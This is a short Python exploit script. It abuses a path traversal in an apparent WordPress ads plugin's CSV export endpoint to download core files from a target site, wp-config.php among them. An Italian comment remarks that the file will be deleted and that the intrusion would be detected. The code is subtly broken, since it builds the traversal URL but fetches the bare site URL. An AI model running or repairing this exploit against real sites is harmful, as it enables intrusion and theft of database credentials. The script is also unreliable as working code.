import urllib.request
import os

def attack(url):

    currentDirectory= os.getcwd()
    choice=input("Insert the absolute path where the downloaded files will be saved: ")

    while(not pathControl(choice)):
        choice=input("Insert the absolute path where the downloaded files will be saved: ")


    fileList=['index.php','wp-activate.php','wp-blog-header.php','wp-comments-post.php','wp-config-sample.php','wp-cron.php',
              'wp-links-opml.php','wp-load.php','wp-login.php','wp-mail.php','wp-settings.php','wp-signup.php',
              'wp-traceback.php','xmlrpc.php','wp-config.php'];
     #if plugin --> wp-config.php + messaggio di avviso del fatto che il file verrà cancellato e quindi verrà sgamato
    for x in fileList:
        print('Downloading: ', x);

        path = url+'/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../'+ x;
        urllib.request.urlretrieve(url, x);

    tempDirectory=os.chdir(currentDirectory)
    print("All Files have been downloaded")



def pathControl(choice):
    try:
        tempDirectory=os.chdir(choice)
        return True
    except:
        return False
